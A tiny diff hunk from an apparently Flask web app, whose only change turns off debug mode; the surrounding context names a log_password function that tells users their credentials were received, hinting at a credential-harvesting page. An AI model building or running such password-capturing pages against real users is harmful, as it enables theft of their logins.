@@ -22,4 +22,4 @@ def log_password():
      return "Thank you! Your credentials have been received."
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
